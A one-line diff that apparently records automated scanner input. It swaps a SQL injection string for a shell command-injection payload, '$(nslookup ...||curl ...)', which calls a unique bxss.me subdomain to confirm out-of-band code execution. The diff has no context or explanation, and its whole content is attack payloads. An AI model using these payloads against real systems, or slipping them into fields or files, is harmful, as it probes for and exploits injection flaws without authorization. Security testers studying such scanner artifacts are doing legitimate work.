@@ -1,1 +1,1 @@
--1' OR 2+929-929-1=0+0+0+1 or 'lwTCeVvr'='
+$(nslookup -q=cname hitwbaouyggxxccd36.bxss.me||curl hitwbaouyggxxccd36.bxss.me)
